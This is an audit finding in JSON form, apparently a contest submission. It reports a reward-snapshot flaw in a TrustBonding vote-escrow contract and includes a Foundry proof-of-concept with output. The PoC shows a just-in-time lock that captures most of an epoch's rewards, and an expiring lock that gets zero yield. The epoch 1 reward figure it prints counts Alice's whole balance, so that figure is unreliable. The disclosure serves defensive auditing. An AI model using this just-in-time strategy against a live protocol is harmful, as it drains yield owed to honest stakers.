      "body": "## Finding description and impact\n\n### Root Cause\nThe `TrustBonding` contract calculates a user's pro-rata share of epoch rewards by taking a single point-in-time snapshot of their `veTRUST` (bonded) balance at the absolute end of the epoch. \n\nThe `_userEligibleRewardsForEpoch` function relies on `userBondedBalanceAtEpochEnd`:\n```solidity\nfunction userBondedBalanceAtEpochEnd(address account, uint256 epoch) public view returns (uint256) {\n    // ... validation ...\n    return _balanceOf(account, _epochTimestampEnd(epoch));\n}\n```\n\nBecause `ve` tokens (Voting Escrow) are designed to **decay linearly over time**, a point-in-time snapshot creates a critical mismatch between the continuous nature of the lock and the discrete nature of reward distribution.\n\n### Impact 1: Just-In-Time (JIT) Reward Theft\nAn attacker can wait until the very last block (or second) of a 14-day epoch and call `create_lock()` with a large amount of `TRUST`. Because the snapshot is taken at the end of the epoch, the attacker's balance is \"fresh\" and has not suffered any decay. \n\nMeanwhile, honest users who locked at the beginning of the epoch have had their balances decaying for 14 days. As a result, the attacker captures a disproportionately large share of the rewards despite their capital only being at risk for a single second of the 14-day period. This allows attackers to systematically drain the protocol's inflationary emissions, diluting the yield for honest participants to negligible levels.\n\n### Impact 2: Systematic Yield Loss for Expiring Locks\nThe `VotingEscrow` logic (inherited from Curve) strictly rounds lock expiries down to the nearest `WEEK`. In standard configurations where `EPOCH_LENGTH` is a multiple of weeks (e.g., 14 days), a user's lock will frequently expire exactly at an `epochTimestampEnd`.\n\nIf a user is locked for the entire duration of an epoch, but their lock expires at the exact second the epoch ends, `_balanceOf(account, _epochTimestampEnd(epoch))` will evaluate to **0**. The user is then told they have `NoRewardsToClaim`, effectively stealing 14 days of yield that their locked capital earned.\n\n## Recommended mitigation steps\nThe protocol should move away from point-in-time snapshots and instead use a **time-weighted average balance** or an **integral** of the user's balance over the duration of the epoch.\n\n1. **Force Epoch Alignment:** Ensure that `EPOCH_LENGTH` is always a multiple of `1 weeks` to align with the underlying `VotingEscrow` intervals.\n2. **Integral Calculation:** Implement a mechanism similar to Curve Finance's native `FeeDistributor`, which calculates rewards by iterating through the weeks of the epoch and calculating the average bias/slope for that period.\n3. **Snapshot Timing:** If a snapshot must be used, snapshotting at the **start** of the epoch is generally safer against JIT attacks (as the user must be locked *before* the epoch starts), but it requires logic to ensure users do not withdraw halfway through and still claim full rewards.",
      "proofOfConcept": "## Proof of Concept \n\nSave the following as `tests/PoCCore.t.sol` and run:\n`forge test --match-contract PoCCore -vv`\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.29;\n\nimport \"tests/BaseTest.t.sol\";\nimport \"forge-std/src/console2.sol\";\nimport \"src/interfaces/ITrustBonding.sol\";\n\ncontract PoCCore is BaseTest {\n\n    function test_submissionValidity_JITRewardTheft() public {\n        // 0. Fund the SatelliteEmissionsController so it can distribute rewards\n        vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);\n\n        // 1. Setup: Fast-forward to the start of a clean epoch (Epoch 1)\n        uint256 epoch0End = protocol.trustBonding.epochTimestampEnd(0);\n        vm.warp(epoch0End + 1);\n        \n        uint256 epoch1Start = block.timestamp;\n        uint256 epoch1End = protocol.trustBonding.epochTimestampEnd(1);\n        \n        console2.log(\"=== THE SETUP ===\");\n        console2.log(\"Epoch 1 Duration: 14 days\");\n\n        // 2. Alice (Honest User) locks 10,000 WTRUST for 52 weeks (1 year) at the start\n        uint256 lockAmount = 10_000 ether;\n        uint256 aliceUnlockTime = epoch1Start + 52 weeks;\n        \n        vm.startPrank(users.alice);\n        protocol.trustBonding.create_lock(lockAmount, aliceUnlockTime);\n        vm.stopPrank();\n\n        console2.log(\"Alice locks 10,000 tokens at START of Epoch 1\");\n\n        // 3. Warp to 1 second before the end of the epoch\n        vm.warp(epoch1End - 1);\n\n        // 4. Bob (JIT Attacker) locks 10,000 WTRUST for 52 weeks\n        // Because he locks later, his unlock time reaches further into the future\n        uint256 bobUnlockTime = block.timestamp + 52 weeks;\n\n        vm.startPrank(users.bob);\n        protocol.trustBonding.create_lock(lockAmount, bobUnlockTime);\n        vm.stopPrank();\n\n        console2.log(\"Bob locks 10,000 tokens 1 second before END of Epoch 1\");\n\n        // 5. Warp into Epoch 2 so Epoch 1 rewards become claimable\n        vm.warp(epoch1End + 1);\n        assertEq(protocol.trustBonding.currentEpoch(), 2, \"Should be Epoch 2\");\n\n        // 6. Alice and Bob claim their rewards for Epoch 1\n        // We measure native balance since rewards are paid in native L3 TRUST\n        uint256 aliceBalanceBefore = address(users.alice).balance;\n        vm.prank(users.alice);\n        protocol.trustBonding.claimRewards(users.alice);\n        uint256 aliceRewards = address(users.alice).balance - aliceBalanceBefore;\n\n        uint256 bobBalanceBefore = address(users.bob).balance;\n        vm.prank(users.bob);\n        protocol.trustBonding.claimRewards(users.bob);\n        uint256 bobRewards = address(users.bob).balance - bobBalanceBefore;\n\n        console2.log(\"\\n=== THE HEIST (REWARDS FOR EPOCH 1) ===\");\n        console2.log(\"Alice Rewards (Contributed 14 Days): \", aliceRewards);\n        console2.log(\"Bob Rewards   (Contributed 1 Second):\", bobRewards);\n\n        // 7. Assert the critical vulnerability\n        // Bob steals MORE rewards than Alice despite providing zero continuous value to the epoch\n        assertTrue(bobRewards > aliceRewards, \"VULNERABILITY PROVEN: JIT attacker stole the rewards\");\n    }\n\n    function test_submissionValidity_ZeroYieldVictim() public {\n        // 0. Fund the controller so it can pay out rewards\n        vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);\n\n        // 1. Setup: Fast-forward to the start of a clean epoch (Epoch 1)\n        uint256 epoch0End = protocol.trustBonding.epochTimestampEnd(0);\n        vm.warp(epoch0End + 1); // Start of Epoch 1\n        \n        uint256 epoch1Start = block.timestamp;\n        \n        console2.log(\"=== THE ZERO-YIELD VICTIM ===\");\n        \n        // 2. Alice locks 10,000 WTRUST for 4 weeks.\n        // This lock perfectly spans Epoch 1 (first 2 weeks) and Epoch 2 (last 2 weeks).\n        uint256 unlockTime = ((epoch1Start + 4 weeks) / 1 weeks) * 1 weeks;\n        \n        vm.startPrank(users.alice);\n        protocol.trustBonding.create_lock(10_000 ether, unlockTime);\n        vm.stopPrank();\n\n        console2.log(\"Alice locks 10,000 tokens for 4 weeks (Spans Epoch 1 & Epoch 2)\");\n\n        // 3. Move to the end of Epoch 1 and claim rewards.\n        // Alice's lock is still active, so she will get rewards.\n        uint256 epoch1End = protocol.trustBonding.epochTimestampEnd(1);\n        vm.warp(epoch1End + 1);\n        \n        vm.prank(users.alice);\n        protocol.trustBonding.claimRewards(users.alice);\n        \n        uint256 aliceRewardsEpoch1 = address(users.alice).balance;\n        console2.log(\"Alice's Rewards for Epoch 1: \", aliceRewardsEpoch1);\n        assertTrue(aliceRewardsEpoch1 > 0, \"Alice should get rewards for Epoch 1\");\n\n        // 4. Move to the end of Epoch 2. \n        // Throughout Epoch 2, Alice's tokens were LOCKED and illiquid.\n        // But exactly at the end of Epoch 2, her lock expires.\n        uint256 epoch2End = protocol.trustBonding.epochTimestampEnd(2);\n        vm.warp(epoch2End + 1);\n        \n        // 5. Alice attempts to claim her yield for Epoch 2\n        vm.prank(users.alice);\n        \n        // We expect this to REVERT because the bug calculates her balance as 0\n        vm.expectRevert(ITrustBonding.TrustBonding_NoRewardsToClaim.selector);\n        protocol.trustBonding.claimRewards(users.alice);\n        \n        console2.log(\"Confirmed: Alice cannot claim rewards for Epoch 2 because her balance snapshot was 0.\");\n    }\n}\n```\n\n```Output\n  === THE SETUP ===\n  Epoch 1 Duration: 14 days\n  Alice locks 10,000 tokens at START of Epoch 1\n  Bob locks 10,000 tokens 1 second before END of Epoch 1\n  \n=== THE HEIST (REWARDS FOR EPOCH 1) ===\n  Alice Rewards (Contributed 14 Days):  490196078113525719522\n  Bob Rewards   (Contributed 1 Second): 509803921886474280477\n\n\n  === THE ZERO-YIELD VICTIM ===\n  Alice locks 10,000 tokens for 4 weeks (Spans Epoch 1 & Epoch 2)\n  Alice's Rewards for Epoch 1:  9999901000000000000000000000\n  Confirmed: Alice cannot claim rewards for Epoch 2 because her balance snapshot was 0.\n```",
